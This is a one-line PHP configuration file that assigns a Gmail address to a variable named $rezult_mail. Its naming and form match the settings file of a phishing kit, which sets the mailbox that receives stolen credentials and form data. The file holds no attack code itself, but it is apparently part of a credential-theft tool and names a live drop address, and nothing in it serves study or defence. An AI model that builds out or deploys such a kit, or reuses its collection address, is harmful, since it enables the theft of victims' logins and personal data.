<?php 
$rezult_mail="bisnishosting45@gmail.com";
?>